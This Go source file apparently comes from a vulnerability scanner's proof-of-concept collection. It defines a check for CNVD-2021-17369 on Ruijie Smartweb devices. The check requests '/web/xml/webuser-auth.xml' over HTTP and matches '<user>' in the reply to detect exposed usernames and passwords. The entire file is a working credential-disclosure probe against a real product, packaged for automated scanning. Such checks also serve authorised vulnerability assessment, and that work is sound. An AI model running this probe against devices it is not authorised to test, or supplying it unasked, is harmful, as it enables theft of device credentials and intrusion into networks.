package poc

func (Info *PocInfo) CNVD_2021_17369_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = "CNVD-2021-17369"
	poc.Info.Target = "ruijie"
	poc.Info.Type = "INFO"
	poc.Info.Name = "ruijie Smartweb username and password INFO"
	poc.Info.Level = 1
	poc.Info.Author = "youzai"

	// 设置poc-Poc信息
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/web/xml/webuser-auth.xml"}
	poc.Poc.Param = []string{""}
	poc.Poc.Header = nil
	poc.Poc.Data = []string{""}
	poc.Poc.Word = []string{"<user>"}

	// 设置poc-Config信息
	poc.Config.Customize = false

	PocStruct = append(PocStruct, poc)
}
